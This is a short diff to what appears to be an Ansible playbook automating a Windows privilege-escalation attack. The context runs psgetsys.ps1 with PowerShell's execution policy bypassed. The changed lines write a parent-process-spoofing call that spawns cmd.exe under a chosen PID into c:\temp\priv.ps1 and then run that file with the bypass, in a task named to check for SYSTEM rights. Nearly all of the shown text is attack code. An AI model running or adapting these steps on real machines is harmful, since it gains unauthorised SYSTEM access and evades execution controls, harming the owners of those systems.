@@ -18,4 +18,5 @@
         powershell.exe -ExecutionPolicy Bypass -Command c:\temp\psgetsys.ps1
     - name: Inject and check if running as system
       win_shell: |
-        [MyProcess]::CreateProcessFromParent({{pid}},"cmd.exe")
+        echo '[MyProcess]::CreateProcessFromParent({{pid}},"cmd.exe")' > c:\temp\priv.ps1
+        powershell.exe -ExecutionPolicy Bypass -Command c:\temp\priv.ps1
